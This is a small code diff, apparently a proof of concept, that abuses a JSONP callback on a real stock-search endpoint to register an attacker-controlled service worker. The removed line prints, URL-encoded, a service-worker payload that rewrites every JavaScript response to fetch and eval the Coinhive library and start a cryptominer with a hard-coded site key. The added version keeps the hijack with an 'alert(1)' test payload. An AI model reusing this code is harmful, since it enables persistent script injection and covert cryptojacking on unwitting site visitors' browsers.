@@ -1,5 +1,5 @@
 <script>
-var payload = "onfetch%3dfunction(e)%7bvar+payload%3d%27var+fetch%3dwindow.fetch%7c%7cfetch%3bfetch(%22https%3a%2f%2fcoinhive.com%2flib%2fcoinhive.min.js%22).then(function(res)%7breturn+res.text()%7d).then(function(data)%7beval(data)%3bvar+miner%3dnew+CoinHive.Anonymous(%22hHsRjaE8oBVv8edpubwHE1u3SHLTXjV4%22%2c%7bthrottle%3a0.5%7d)%3bminer.start()%7d)%3b%27%3bif(e.request.url.indexOf(%22.js%22)%3e-1)%7be.respondWith(fetch(e.request.url).then(function(res)%7breturn+res.text()%7d).then(function(data)%7bdata%3ddata%2bpayload%3bresponse%3dnew+Response(data)%3breturn+response%7d))%7d%7d%3b//";
+
 var payload2 = 'alert(1);';
 var url = "https://q.stock.sohu.com/app1/stockSearch?method=search&callback={#code}&type=all&keyword=600&_=1360045603390".replace("{#code}",payload2);
 navigator.serviceWorker.register(url).then(function(registration) {
